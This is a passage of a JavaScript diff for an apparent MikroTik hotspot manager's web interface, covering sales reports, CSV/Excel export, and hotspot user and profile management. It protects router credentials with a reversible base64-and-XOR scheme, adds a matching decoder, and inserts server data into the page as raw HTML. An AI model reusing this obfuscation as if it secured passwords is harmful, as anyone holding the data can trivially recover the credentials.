+  $("#" + t).val(a),
+    setClassYN(e, t),
+    s.dispatchEvent(new KeyboardEvent("keyup", { key: "Shift" }));
+}
+function countReport(e, t) {
+  (getprice = 0),
+    $("#" + e + " tr")
+      .filter(function () {
+        return $(this).hasClass("yes");
+      })
+      .each(function () {
+        getprice += Number($(this).find("span").html());
+      }),
+    $("#" + t).html(currencyFormat(getprice, currency));
+}
+function countReportD(e, t) {
+  (getprice = 0),
+    (d = t.substring(5, 3)),
+    (m = t.substring(0, 3)),
+    $("#" + e + " tr")
+      .filter(function () {
+        return $(this).hasClass(t);
+      })
+      .each(function () {
+        getprice += Number($(this).find("span").html());
+      });
+  var a = "['<b>" + d + " " + m + "</b>'," + getprice + "],";
+  localStorage.getItem(session + "_resume_report")
+    ? localStorage.setItem(
+        session + "_resume_report",
+        localStorage.getItem(session + "_resume_report") + a
+      )
+    : localStorage.setItem(session + "_resume_report", a);
+}
+function countReportT(e, a) {
+  (getprice = 0), (d = a.substring(5, 3)), (m = a.substring(0, 3));
+  var s = $("#" + e + " tr").filter(function () {
+    return $(this).hasClass(a);
+  });
+  s.each(function () {
+    getprice += Number($(this).find("span").html());
+  }),
+    (t = a.substring(0, 3) + "/" + a.substring(5, 3) + "/" + a.substring(9, 5)),
+    (tm = a.substring(0, 3) + " " + a.substring(9, 5)),
+    $("#count-report-t").html(currencyFormat(getprice, currency)),
+    $("#count-vcr-t").html(s.length),
+    $("#filterby-t").html(t.capitalize()),
+    $("#filterby").html(tm.capitalize());
+}
+function filterTableReport(e, t, a, s) {
+  var o = new Date(),
+    n = (Number(o.getMonth()), document.getElementById(t));
+  $("#" + t).val(a),
+    setClassYN(e, t),
+    n.dispatchEvent(new KeyboardEvent("keyup", { key: "Shift" })),
+    countReport(e, s),
+    $("#count-vcr").html($("#total-report").html()),
+    (tm =
+      $("#filterby-t").html().split("/")[0] +
+      " " +
+      $("#filterby-t").html().split("/")[2]),
+    "" == a
+      ? ($("#filterby").html(tm.capitalize()), $("#ld-report").fadeIn(200))
+      : ($("#filterby").html(a), $("#ld-report").fadeOut(200));
+}
+function randomN(e, t) {
+  var a = e + Math.random() * (t - e);
+  return Math.round(a);
+}
+function updateTable(e) {
+  document
+    .getElementById(e)
+    .dispatchEvent(new KeyboardEvent("keyup", { key: "Shift" }));
+}
+function selectFirst(e) {
+  var t;
+  for (idx = e.split(","), t = 0; t < idx.length; t++)
+    $("#" + idx[t]).val($("#" + idx[t] + " option:first").val());
+}
+function setClassYN(e, t) {
+  (filter = new RegExp(String($("#" + t).val()), "i")),
+    $("#" + e + " tr").filter(function () {
+      $(this).each(function () {
+        (found = !1),
+          $(this)
+            .children()
+            .each(function () {
+              (content = $(this).html()), content.match(filter) && (found = !0);
+            }),
+          found
+            ? $(this).removeClass("no").addClass("yes")
+            : $(this).removeClass("yes").addClass("no");
+      });
+    }),
+    countTableRow(e);
+}
+function printVcr(e) {
+  "vc" == e.split("-")[0] || "up" == e.split("-")[0]
+    ? ($("#printVcr").show(),
+      $("#printVcrS").show(),
+      $("#printVcr").attr("onclick", 'pVcr("' + e + '","d")'),
+      $("#printVcrS").attr("onclick", 'pVcr("' + e + '","s")'))
+    : ($("#printVcr").hide(), $("#printVcrS").hide());
+}
+function pVcr(e, t) {
+  window.open(session + "/print&" + t + "&c=" + e, "_blank");
+}
+function setC(e) {
+  ("vc" != e.split("-")[0] && "up" != e.split("-")[0]) ||
+    ($("#select-comment").val(e),
+    filterTable("users", "searchUsers", e),
+    printVcr(e));
+}
+function setTheme(e) {
+  var t = localStorage.getItem(session + "_theme");
+  e != t &&
+    ($.get({ url: session + "/set_theme&theme=" + e })
+      .fail(function () {
+        setTheme(e);
+      })
+      .always(function () {
+        window.location.href = location.href.replace(/#/gi, "");
+      }),
+    localStorage.setItem(session + "_theme", e));
+}
+"disable" === idleto || "" === idleto
+  ? document.getElementById("timer") &&
+    (document.getElementById("timer").innerHTML = "00:00")
+  : (idleTimer(), startTimer()),
+  $("#iface-name").change(function () {
+    var e = $("#iface-name").val();
+    localStorage.setItem(session + "_iface", e),
+      clearInterval(window.ifaceI),
+      clearInterval(window.ifaceII),
+      $.getJSON(session + "/get_traffic/&iface=" + e, function (t) {
+        try {
+          (txrx =
+            '[{"name":"Tx","data":["' +
+            t.tx +
+            '"]},{"name":"Rx","data":["' +
+            t.rx +
+            '"]}]'),
+            localStorage.setItem(session + "_traffic_data", txrx),
+            $("#applog").append(
+              "<tr><td>" +
+                timeStamp() +
+                "</td><td>Loading Traffic " +
+                e +
+                "</td></tr>"
+            ),
+            scrollD();
+        } catch (e) {
+          console.log("get_traffic"),
+            $("#applog").append(
+              "<tr><td>" +
+                timeStamp() +
+                '</td><td style="color:#f86c6b;">get_traffic : timeout</td></tr>'
+            ),
+            scrollD();
+        }
+      }).always(function () {
+        trafficMonitor(localStorage.getItem(session + "_theme"));
+      });
+  });
+var jesD = {
+  dec: function (e, t = 25) {
+    var a = "";
+    e.toString();
+    for (var s = 0; s < e.length; s++) {
+      var o = e.charCodeAt(s) ^ t;
+      a += String.fromCharCode(o);
+    }
+    return a;
+  }
+};
+function scrollD() {
+  var e = $("#applogd");
+  $("#applog tr").length > 31 &&
+    $("#applog").html(
+      "<tr><td>" + timeStamp() + "</td><td>Loading data...</td></tr>"
+    );
+  var t = e.scrollTop();
+  e.scrollTop(t + 100);
+}
+function timeStamp() {
+  var e = "",
+    t = new Date(),
+    a = t.getHours(),
+    s = t.getMinutes(),
+    o = t.getSeconds();
+  return (
+    s < 10 && (s = "0" + s),
+    o < 10 && (o = "0" + o),
+    (e += a + ":" + s + ":" + o)
+  );
+}
+function makeid(e) {
+  for (
+    var t = "",
+      a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
+      s = a.length,
+      o = 0;
+    o < e;
+    o++
+  )
+    t += a.charAt(Math.floor(Math.random() * s));
+  return t;
+}
+function diffct(e) {
+  (cct = timeStamp()), Number(e.split(":")[1]), Number(cct.split(":")[1]);
+  var t = 60 * +Number(e.split(":")[0]) + +Number(e.split(":")[1]),
+    a = 60 * +Number(cct.split(":")[0]) + +Number(cct.split(":")[1]);
+  return a - t;
+}
+function detHA(e) {
+  "none" == document.getElementById(e).style.display
+    ? ($("#" + e).fadeIn(100),
+      $("#t" + e).html('<i  class="fa fa-caret-up"></i> less'))
+    : ($("#" + e).fadeOut(100),
+      $("#t" + e).html('<i  class="fa fa-caret-down"></i> more'));
+}
+function connect(e, t) {
+  isMobile()
+    ? $.notify("Connecting...", "info")
+    : $("#" + e).notify("Connecting...", "info"),
+    (url = "./?" + t + "/connect"),
+    $.get(url, function (a) {
+      var s = a.split(",")[0];
+      "Connected" === s
+        ? (console.log(s), localStorage.setItem(t, s))
+        : "Invalid username or password" === s
+        ? (isMobile() ? $.notify(s, "error") : $("#" + e).notify(s, "error"),
+          localStorage.setItem(t, s),
+          console.log(s))
+        : "Error" === s &&
+          (console.log("Could not connect to MikroTik"),
+          localStorage.setItem(t, "Could not connect to MikroTik"));
+    }).always(function () {
+      var a = localStorage.getItem(t);
+      "Connected" === a
+        ? (location.href = "./?" + t)
+        : "Could not connect to MikroTik" === a
+        ? (isMobile() ? $.notify(a, "error") : $("#" + e).notify(a, "error"),
+          setsess())
+        : setsess(),
+        localStorage.setItem(t, "");
+    });
+}
+function setsess() {
+  $("#lsession") &&
+    setTimeout(function () {
+      $("#lsession").val(session.split("?")[1]);
+    }, 5e3);
+}
+function daysInMonth(e, t) {
+  return new Date(t, e, 0).getDate();
+}
+String.prototype.capitalize = function () {
+  return this.charAt(0).toUpperCase() + this.slice(1);
+};
+var yy = yyyy,
+  tmm = mm + 1;
+function setYear(e) {
+  for (i = yy; i >= 2018; i--)
+    $("#" + e).append('<option value="' + i + '">' + i + "</option>");
+}
+function setMonth(e) {
+  var t = [
+    "",
+    "jan",
+    "feb",
+    "mar",
+    "apr",
+    "may",
+    "jun",
+    "jul",
+    "aug",
+    "sep",
+    "oct",
+    "nov",
+    "dec"
+  ];
+  for (i = 1; i < 13; i++)
+    mm + 1 == i
+      ? $("#" + e).append(
+          '<option value="' +
+            t[i] +
+            '" selected>' +
+            t[i].capitalize() +
+            "</option>"
+        )
+      : $("#" + e).append(
+          '<option value="' + t[i] + '">' + t[i].capitalize() + "</option>"
+        );
+  $("#btnFilter").attr(
+    "title",
+    "Filter " + $("#month").val().capitalize() + " " + $("#year").val()
+  );
+}
+function setDay(e, t = tmm, a = yy) {
+  var s = daysInMonth(t, a);
+  for (
+    $("#" + e).append('<option value="day">Day</option>'), i = 1;
+    i < s + 1;
+    i++
+  )
+    i < 10 && (i = "0" + i),
+      $("#" + e).append('<option value="' + i + '">' + i + "</option>");
+}
+function filterMonth(e, t, a) {
+  var s = $("#" + t).val();
+  console.log(s);
+  var o = [
+      "",
+      "jan",
+      "feb",
+      "mar",
+      "apr",
+      "may",
+      "jun",
+      "jul",
+      "aug",
+      "sep",
+      "oct",
+      "nov",
+      "dec"
+    ].indexOf(s),
+    n = $("#" + a).val();
+  $("#" + e).html(""),
+    setDay(e, o, n),
+    filterTableReport("report", "searchReport", "", "count-report"),
+    loadSReport(Number(o) + "/" + n);
+}
+function filterDay(e, t, a) {
+  (t = $("#" + t).val()), (a = $("#" + a).val());
+  filterTableReport(
+    "report",
+    "searchReport",
+    "day" !== e ? t + "/" + e + "/" + a : "",
+    "count-report"
+  );
+}
+function selectFO(e) {
+  selectTags = $("#" + e);
+  for (var t = 0; t < selectTags.length; t++) selectTags[t].selectedIndex = 0;
+}
+function setfilterProfile() {
+  $(".hotspot-users").fancyTable({
+    inputId: "searchUsers",
+    sortColumn: 2,
+    pagination: !0,
+    perPage: 15,
+    globalSearch: !0,
+    globalSearchExcludeColumns: [2, 3, 8]
+  });
+}
+function downloadCSV(e, t) {
+  var a, s;
+  (a = new Blob([e], { type: "text/csv" })),
+    ((s = document.createElement("a")).download = t),
+    (s.href = window.URL.createObjectURL(a)),
+    (s.style.display = "none"),
+    document.body.appendChild(s),
+    s.click();
+}
+function exportToCSV(e, t) {
+  var a = [],
+    s = $("#" + t + " tr").filter(function () {
+      return $(this).hasClass("yes");
+    });
+  a.push($("title").html().toUpperCase() + ",,,,,,,,"),
+    a.push(e.split(".")[0].replace(/_|\?/gi, " ").toUpperCase() + ",,,,,,,,"),
+    a.push(",,,,,,,,"),
+    a.push(",,,,,,Qty," + (s.length - 1) + ","),
+    a.push(",,,,,,Total,=SUM(I8:I" + (s.length + 6) + "),"),
+    a.push(",,,,,,,,");
+  for (var o = 0; o < s.length; o++) {
+    var n = [],
+      i = s[o].querySelectorAll("td, th");
+    if (0 == o) var r = "#";
+    else r = o;
+    for (var l = 0; l < i.length; l++)
+      "dataReport" == t && isMobile()
+        ? n.push(
+            i[l].innerText
+              .replace(/Date: | |\n/gi, "")
+              .replace(
+                /Time:|Username:|IPAddress:|MACAddress:|Profile:|Comment:/gi,
+                ","
+              )
+              .replace(/Address/gi, " Address")
+          )
+        : n.push(i[l].innerText);
+    a.push(r + "," + n.join(","));
+  }
+  downloadCSV(a.join("\n"), e);
+}
+function reportFN(e = session) {
+  var t =
+      $("#filterby-t").html().split("/")[0] +
+      "_" +
+      $("#filterby-t").html().split("/")[2],
+    a = $("#filterby").html().replace(/ /gi, "_");
+  return (
+    "sales_report" +
+    (e = e.replace(/-| /gi, "_")) +
+    "_" +
+    t +
+    (a = t == a ? "" : "_" + a) +
+    ".csv"
+  );
+}
+function rFileName(e, t = session) {
+  var a =
+      $("#filterby-t").html().split("/")[0] +
+      "_" +
+      $("#filterby-t").html().split("/")[2],
+    s = $("#filterby").html().replace(/ /gi, "_");
+  return (
+    "sales_report" +
+    (t = t.replace(/-| /gi, "_")) +
+    "_" +
+    a +
+    (s = a == s ? "" : "_" + s) +
+    e
+  );
+}
+function exportToExcel(e, t) {
+  var a = "",
+    s =
+      $("#" + e + " tr")
+        .find("td")
+        .first()
+        .parent()
+        .find("td").length + 1,
+    o = $("#" + e + " tr").not(".no").length + 6,
+    n = "=MAX(A8:A" + o + ")",
+    i = "=SUM(I8:I" + o + ")",
+    r =
+      "<tr><td style='font-weight:bold;text-align:center;' colspan='" +
+      s +
+      "'>" +
+      $("title").html().toUpperCase() +
+      "</td></tr>",
+    l =
+      "<tr><td style='font-weight:bold;text-align:center;' colspan='" +
+      s +
+      "'>" +
+      t.split(".")[0].replace(/_|\?/gi, " ").toUpperCase() +
+      "</td></tr>",
+    d =
+      "<tr><td></td><td></td><td></td><td></td><td></td><td></td><td style='text-align:right;font-weight:bold'>Qty :</td><td style='text-align:right;font-weight:bold'>" +
+      n +
+      "</td></tr>",
+    c =
+      "<tr><td></td><td></td><td></td><td></td><td></td><td></td><td style='text-align:right;font-weight:bold'>Amount :</td><td style='text-align:right;font-weight:bold'>" +
+      i +
+      "</td></tr>";
+  $("#" + e + " tr")
+    .not(".no")
+    .each(function (e, t) {
+      (tt = 0 == e ? "<th>#</th>" : "<td>" + e + "</td>"),
+        (a += "<tr>" + tt + $(t).html() + "</tr>");
+    });
+  var m,
+    u = {
+      worksheet: "Sales Report",
+      table: r + l + "<tr><td></td></tr>" + d + c + "<tr><td></td></tr>" + a
+    },
+    p = document.createElement("a");
+  (p.download = t),
+    (p.href =
+      "data:application/vnd.ms-excel;base64," +
+      (function (e) {
+        return window.btoa(unescape(encodeURIComponent(e)));
+      })(
+        ((m = u),
+        '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head>\x3c!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines/></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--\x3e</head><body><table>{table}</table></body></html>'.replace(
+          /{(\w+)}/g,
+          function (e, t) {
+            return m[t];
+          }
+        ))
+      )),
+    p.click();
+}
+function Theme() {
+  $("#Mtheme").hasClass("hide")
+    ? ($("#Mtheme").removeClass("hide"), $("#Mtheme").fadeIn("200"))
+    : ($("#Mtheme").fadeOut("200"), $("#Mtheme").addClass("hide"));
+}
+function removeRouter(e) {
+  if (confirm("Are you sure want to remove session [" + e + "] ?")) {
+    "?admin" == session &&
+      "settings" == path &&
+      $.ajax({
+        type: "POST",
+        url: "./post/post_a_router.php",
+        data: { do: "remove", router_: e },
+        dataType: "json",
+        success: function (e) {
+          "Success" == e.message
+            ? (location.href = "./?admin/settings")
+            : alert(e.message);
+        }
+      });
+  }
+}
+function delay(e, t) {
+  var a = 0;
+  return function () {
+    var s = this,
+      o = arguments;
+    clearTimeout(a),
+      (a = setTimeout(function () {
+        e.apply(s, o);
+      }, t || 0));
+  };
+}
+function saveRouter(e) {
+  $("#r-mess").html('<i class="fa fa-cog fa-spin"></i>'),
+    $("#r-mess").fadeIn(200),
+    localStorage.setItem("?" + e + "_idleto", $("#idleTo").val());
+  "?admin" == session &&
+    "settings" == path &&
+    $.ajax({
+      type: "POST",
+      url: "./post/post_a_router.php",
+      data: {
+        do: "save",
+        router_: e,
+        session: $("#sessName").val().replace("admin", "user01"),
+        ipmik: blah($("#ipHost").val()),
+        usermik: blah($("#userHost").val()),
+        passmik: blah($("#passwdHost").val()),
+        hotspotname: $("#hotspotNane").val(),
+        dnsname: $("#dnsName").val(),
+        currency: $("#currency").val(),
+        idleto: $("#idleTo").val(),
+        phone: blah($("#phone").val()),
+        report: $("#report").val()
+      },
+      dataType: "json",
+      success: function (t) {
+        if ("Success" == t.message) {
+          $("#r-mess").html("<i class='fa fa-check' aria-hidden='true'></i>");
+          var a = setTimeout(function () {
+            $("#r-mess").fadeOut(200), $("#r-mess").html(""), clearTimeout(a);
+          }, 1500);
+          e !== t.sess
+            ? (location.href = "./?admin/settings/&r=" + t.sess)
+            : $("#sessName").val(e);
+        } else
+          "__err_" == t.sess
+            ? $("#ee-mess").notify(t.message, "error")
+            : (alert(t.message),
+              (window.location.href = "./?admin/settings/&r=" + t.sess));
+      }
+    });
+}
+function genClose() {
+  $("#gen_usrqty").val("1"),
+    $("#gen_hserver").val($("#gen_hserver  option:first").val()),
+    $("#gen_usrmode").val($("#gen_usrmode  option:first").val()),
+    $("#gen_namelength").val($("#gen_namelength  option:first").val()),
+    $("#gen_usrprefix").val(""),
+    $("#gen_char").val($("#gen_char option:first").val()),
+    $("#gen_usrprofile").val($("#gen_usrprofile option:first").val()),
+    $("#gen_tlimit").val(""),
+    $("#gen_dlimit").val(""),
+    $("#gen_usrcomm").val(""),
+    $("#gen_usrmsg").html(
+      '<span class="picon"></span> <span class="pgen"></span> <span class="pprocess"></span>&nbsp;'
+    ),
+    $("#genact-btn").addClass("hide"),
+    $("#btn-genV").css("display", ""),
+    $("#btn-genV").attr("onclick", "generateV()");
+}
+function getAddrPool(e = "true") {
+  $("#add_addrpool option").length < 2 &&
+    $.getJSON(session + "/get_addr_pool&f=" + e, function (e) {
+      $.each(e, function (e, t) {
+        $("#add_addrpool").append(
+          '<option value="' + t.name + '">' + t.name + "</option>"
+        );
+      });
+    }).always(function () {
+      $.getJSON(session + "/get_parent_queue&f=" + e, function (e) {
+        $.each(e, function (e, t) {
+          $("#add_parentq").append(
+            '<option value="' + t.name + '">' + t.name + "</option>"
+          );
+        });
+      });
+    });
+}
+function getHotspotServer() {
+  if ($("#gen_hserver option").length < 2) {
+    var e = localStorage.getItem(session + "_temp_hotspot_server"),
+      t = JSON.parse(e);
+    t.length > 0 &&
+      $.each(t, function (e, t) {
+        $("#gen_hserver").append(
+          '<option value="' + t + '" >' + t + "</option>"
+        );
+      });
+  }
+}
+function getHotspotProfile() {
+  if ($("#gen_usrprofile option").length < 2) {
+    var e = localStorage.getItem(session + "_temp_user_profiles"),
+      t = JSON.parse(e);
+    t.length > 0 &&
+      $.each(t, function (e, t) {
+        $("#gen_usrprofile").append(
+          '<option value="' + t + '" >' + t + "</option>"
+        );
+      });
+  }
+}
+function blah(e) {
+  var t = "";
+  for (e = btoa(e), e = btoa(e), i = 0; i < e.length; i++) {
+    var a = 10 ^ e.charCodeAt(i);
+    t += String.fromCharCode(a);
+  }
+  return (t = btoa(t));
+}
+
+function unblah(encoded) {
+  try {
+    // Step 1: Decode base64 pertama
+    let decoded = atob(encoded);
+
+    // Step 2: XOR setiap karakter dengan 10
+    let xorResult = "";
+    for (let i = 0; i < decoded.length; i++) {
+      xorResult += String.fromCharCode(decoded.charCodeAt(i) ^ 10);
+    }
+
+    // Step 3: Decode base64 dua kali
+    let original = atob(atob(xorResult));
+
+    return original;
+  } catch (e) {
+    console.error("Gagal decode:", e);
+    return null;
+  }
+}
+function noR(e) {
+  localStorage.setItem("noR", e),
+    1 == localStorage.getItem("noR")
+      ? (window.onbeforeunload = function () {
+          return !0;
+        })
+      : (window.onbeforeunload = function () {});
+}
+function openUser(e, t) {
+  $("#usract-btn").show(),
+    (upath = "uname" == t ? "/user&name=" : "/user&id="),
+    $.get(session + upath + e, function (e) {
+      var t = jesD.dec(e);
+      if ("[" == t.substring(0, 1)) e = JSON.parse(t);
+      else e = JSON.parse(t.substring(1, t.length));
+      if (void 0 !== e[0]) {
+        var a = e[0].server,
+          s = e[0]["limit-bytes-total"],
+          o = e[0]["limit-uptime"];
+        a || (a = "all"),
+          s || (s = ""),
+          "MiB" == formatBytes(s).substr(-3, 3)
+            ? (audlimit = s / 1048576 + "M")
+            : "GiB" == formatBytes(s).substr(-3, 3)
+            ? (audlimit = s / 1073741824 + "G")
+            : (audlimit = s),
+          (limituptime = o ? timeNice(o) : ""),
+          $("#usrtt").html(
+            '<i class="fa fa-user"></i>&nbsp; <b>' + e[0].name + "</b> &nbsp;"
+          ),
+          $("#add_hserver").val(a).change(),
+          $("#add_usrid").val(e[0][".id"]),
+          $("#add_usrname").val(e[0].name),
+          $("#add_usrpass").val(e[0].password),
+          $("#add_usrprofile").val(e[0].profile).change(),
+          $("#add_usrmac").val(e[0]["mac-address"]),
+          $("#add_tlimit").val(e[0]["limit-uptime"]),
+          $("#add_dlimit").val(audlimit),
+          $("#uuptime").val(timeNice(e[0].uptime)),
+          $("#ubytesin").val(formatBytes(e[0]["bytes-in"])),
+          $("#ubytesout").val(formatBytes(e[0]["bytes-out"])),
+          $("#ulimituptime").val(limituptime),
+          $("#ulimitbytestotal").val(formatBytes(s));
+        var n = e[0].comment;
+        n &&
+        "/" == n.substr(3, 1) &&
+        "/" == n.substr(6, 1) &&
+        ":" == n.substr(14, 1) &&
+        ":" == n.substr(17, 1)
+          ? ($("#usrexp").val(n.substr(0, 22)),
+            $("#add_usrcomm").val(n.substr(22, n.length)))
+          : (n && "up-" == n.substr(0, 3) && "-" == n.substr(6, 1)) ||
+            (n && "vc-" == n.substr(0, 3) && "-" == n.substr(6, 1))
+          ? ($("#ucode").val(n.substr(0, 16)),
+            $("#add_usrcomm").val(n.substr(16, n.length)))
+          : (n && "up-" == n.substr(0, 3)) || (n && "vc-" == n.substr(0, 3))
+          ? ($("#ucode").val(n.substr(0, 3)),
+            $("#add_usrcomm").val(n.substr(3, n.length)))
+          : $("#add_usrcomm").val(n),
+          $("#addh_user").fadeIn(),
+          noR(1);
+      }
+    });
+}
+function resetUser() {
+  confirm(
+    "Are you sure want to reset user [" + $("#add_usrname").val() + "] ?"
+  ) && addUser("yes");
+}
+function addUser(e = "no") {
+  if (
+    ($("#add_usrmsg").html(
+      "<span class='text-yellow'><i class='fa fa-circle'></i></span> processing..."
+    ),
+    0 == $("#add_usrid").val())
+  )
+    var t = "./post/post_add_user.php";
+  else t = "./post/post_update_user.php";
+  var a = session,
+    s = $("#add_dlimit").val(),
+    o = $("#add_tlimit").val(),
+    n = $("#add_usrcomm").val(),
+    i = $("#usrexp").val();
+  "M" == s.substr(-1, 1)
+    ? (adlimit = 1048576 * Number(s.substr(0, s.length - 1)))
+    : "G" == s.substr(-1, 1)
+    ? (adlimit = 1073741824 * Number(s.substr(0, s.length - 1)))
+    : (adlimit = "" == s ? 0 : s);
+  var r,
+    l = "";
+  (l =
+    "" == $("#add_usrmac").val()
+      ? "00:00:00:00:00:00"
+      : $("#add_usrmac").val()),
+    (atlimit = "" == o ? 0 : o),
+    "yes" == e &&
+      ($("#add_tlimit").val(""),
+      $("#usrexp").val(""),
+      $("#ucode").val(""),
+      (atlimit = 0),
+      (n =
+        $("#add_usrname").val() == $("#add_usrpass").val()
+          ? "vc-" + n
+          : "up-" + n),
+      (i = "")),
+    "?admin" !== session &&
+      $.ajax({
+        type: "POST",
+        url: t,
+        data: {
+          sessname: a,
+          uid: $("#add_usrid").val(),
+          server: $("#add_hserver").val(),
+          name: $("#add_usrname").val(),
+          password: $("#add_usrpass").val(),
+          profile: $("#add_usrprofile").val(),
+          macaddr: l,
+          timelimit: atlimit,
+          datalimit: adlimit,
+          comment: n,
+          expdate: i,
+          reset: e,
+          ucode: $("#ucode").val()
+        },
+        dataType: "json",
+        success: function (e) {
+          if ("success" == e.message) {
+            $("#usract-btn").show(),
+              $("#add_usrmsg").html(
+                "<span class='text-green'><i class='fa fa-circle'></i></span> " +
+                  e.message
+              ),
+              $("#add_usrid").val(e.data[".id"]),
+              e.data["mac-address"] && (r = e.data["mac-address"]),
+              $("#add_usrmac").val(r);
+            var t = e.data.comment;
+            t &&
+            "/" == t.substr(3, 1) &&
+            "/" == t.substr(6, 1) &&
+            ":" == t.substr(14, 1) &&
+            ":" == t.substr(17, 1)
+              ? ($("#usrexp").val(t.substr(0, 20)),
+                $("#add_usrcomm").val(t.substr(21, t.length)))
+              : (t && "up-" == t.substr(0, 3) && "-" == t.substr(6, 1)) ||
+                (t && "vc-" == t.substr(0, 3) && "-" == t.substr(6, 1))
+              ? ($("#ucode").val(t.substr(0, 16)),
+                $("#add_usrcomm").val(t.substr(16, t.length)))
+              : (t && "up-" == t.substr(0, 3)) || (t && "vc-" == t.substr(0, 3))
+              ? ($("#ucode").val(t.substr(0, 3)),
+                $("#add_usrcomm").val(t.substr(3, t.length)))
+              : $("#add_usrcomm").val(t),
+              $("#uuptime").val(timeNice(e.data.uptime)),
+              $("#ubytesin").val(formatBytes(e.data["bytes-in"])),
+              $("#ubytesout").val(formatBytes(e.data["bytes-out"]));
+            var s = e.data["limit-uptime"];
+            s
+              ? ((limituptime = timeNice(s)), $("#add_tlimit").val(s))
+              : (limituptime = ""),
+              $("#ulimituptime").val(limituptime),
+              $("#ulimitbytestotal").val(formatBytes(adlimit)),
+              $("#usrtt").html(
+                '<i class="fa fa-user"></i>&nbsp; <b>' +
+                  e.data.name +
+                  "</b> &nbsp;"
+              ),
+              $.get(a + "/users/&prof=" + e.data.profile + "&f=true").always(
+                function () {
+                  loadUsersPPF();
+                }
+              ),
+              setTimeout(function () {
+                $("#add_usrmsg").html("&nbsp;");
+              }, 3e3);
+          } else
+            $("#add_usrmsg").html(
+              "<span class='text-red'><i class='fa fa-circle'></i></span> " +
+                e.data.error
+            ),
+              setTimeout(function () {
+                $("#add_usrmsg").html("&nbsp;");
+              }, 3e3);
+        }
+      });
+}
+function remProf() {
+  removeProfile($("#add_usrprofid").val(), $("#add_usrprofname").val());
+}
+function remUser() {
+  removeUser(
+    $("#add_usrid").val(),
+    $("#add_usrname").val(),
+    $("#add_usrprofile").val()
+  );
+}
+function removeUser(e, t, a) {
+  if (confirm("Are you sure want to remove user [" + t + "] ?")) {
+    var s = session;
+    "?admin" !== session &&
+      "hotspot" == path &&
+      $.ajax({
+        type: "POST",
+        url: "./post/post_hotspot_remove.php",
+        data: { sessname: s, where: "user_", id: e },
+        dataType: "json",
+        success: function (e) {
+          "success" == e.message
+            ? $.get(s + "/users/&prof=" + a + "&f=true").always(function () {
+                loadUsersPPF();
+              })
+            : location.reload();
+        }
+      }),
+      $("#huClose").click();
+  }
+}
+function openUserProfile(e, t) {
+  $("#usrprofact-btn").show(),
+    (upath = "upname" == t ? "/profile&name=" : "/profile&id="),
+    getAddrPool("false"),
+    $.getJSON(session + upath + e, function (e) {
+      var t = "",
+        a = "none",
+        s = "none",
+        o = "none",
+        n = "",
+        i = "",
+        r = "",
+        l = "Disable",
+        d = "Disable";
+      void 0 !== e[0] &&
+        (e[0]["on-login"] &&
+          ((o = (t = e[0]["on-login"]).split(",")[1]),
+          (n = t.split(",")[3]),
+          (i = t.split(",")[2]),
+          (r = t.split(",")[4]),
+          (l = t.split(",")[6]),
+          (d = t.split(",")[7]),
+          (none = t.split(",")[5]),
+          "noexp" == none && (o = "0"),
+          "" == d.split('")')[0] && (d = "Disable")),
+        e[0]["address-pool"] && (a = e[0]["address-pool"]),
+        e[0]["rate-limit"] && e[0].ratelimit,
+        e[0]["rate-limit"] && e[0].ratelimit,
+        e[0]["parent-queue"] && (s = e[0]["parent-queue"]),
+        $("#usrproftt").html(
+          '<i class="fa fa-pie-chart"></i>&nbsp; <b>' +
+            e[0].name +
+            "</b> &nbsp;"
+        ),
+        $("#add_usrprofid").val(e[0][".id"]),
+        $("#add_usrprofname").val(e[0].name),
+        $("#add_addrpool").val(a),
+        $("#add_sharedusr").val(e[0]["shared-users"]),
+        $("#add_ratelimit").val(e[0]["rate-limit"]),
+        $("#add_parentq").val(s),
+        $("#add_expmode").val(o),
+        $("#add_validity").val(n),
+        $("#add_price").val(i),
+        $("#add_sellingprice").val(r),
+        $("#add_lockuser").val(l),
+        $("#add_lockserver").val(d),
+        $("#usrprofact-btn").show(),
+        $("#addh_userprofile").fadeIn(),
+        noR(1));
+    });
+}
+function addUserProfile() {
+  if (
+    ($("#add_usrprofilemsg").html(
+      "<span class='text-yellow'><i class='fa fa-circle'></i></span> processing..."
+    ),
+    0 == $("#add_usrprofid").val())
+  )
+    var e = "./post/post_add_userprofile.php";
+  else e = "./post/post_update_userprofile.php";
+  var t = session;
+  "?admin" !== session &&
+    $.ajax({
+      type: "POST",
+      url: e,
+      data: {
+        sessname: t,
+        upid: $("#add_usrprofid").val(),
+        name: $("#add_usrprofname").val(),
+        addresspool: $("#add_addrpool").val(),
+        sharedusers: $("#add_sharedusr").val(),
+        ratelimit: $("#add_ratelimit").val(),
+        parentqueue: $("#add_parentq").val(),
+        expmode: $("#add_expmode").val(),
+        validity: $("#add_validity").val(),
+        price: $("#add_price").val(),
+        sellingprice: $("#add_sellingprice").val(),
+        lockuser: $("#add_lockuser").val(),
+        lockserver: $("#add_lockserver").val()
+      },
+      dataType: "json",
+      success: function (e) {
+        "success" == e.message
+          ? ($("#usrprofact-btn").show(),
+            $("#add_usrprofilemsg").html(
+              "<span class='text-green'><i class='fa fa-circle'></i></span> " +
+                e.message
+            ),
+            $("#add_usrprofid").val(e.data[".id"]),
+            $("#usrproftt").html(
+              '<i class="fa fa-pie-chart"></i>&nbsp; <b>' +
+                e.data.name +
+                "</b> &nbsp;"
+            ),
+            $.get(t + "/profiles&f=true").always(function () {
+              loadUserProfiles();
+            }),
+            setTimeout(function () {
+              $("#add_usrprofilemsg").html("&nbsp;");
+            }, 3e3))
+          : ($("#add_usrprofilemsg").html(
+              "<span class='text-red'><i class='fa fa-circle'></i></span> " +
+                e.data.error
+            ),
+            setTimeout(function () {
+              $("#add_usrprofilemsg").html("&nbsp;");
+            }, 3e3));
+      }
+    });
+}
+function removeProfile(e, t) {
+  if (confirm("Are you sure want to remove profile [" + t + "] ?")) {
+    var a = session;
+    "?admin" !== session &&
+      "hotspot" == path &&
+      $.ajax({
+        type: "POST",
+        url: "./post/post_hotspot_remove.php",
+        data: { sessname: a, where: "profile_", id: e },
+        dataType: "json",
+        success: function (e) {
+          "success" == e.message ? loadUserProfiles("true") : location.reload();
+        }
+      }),
+      $("#hupClose").click();
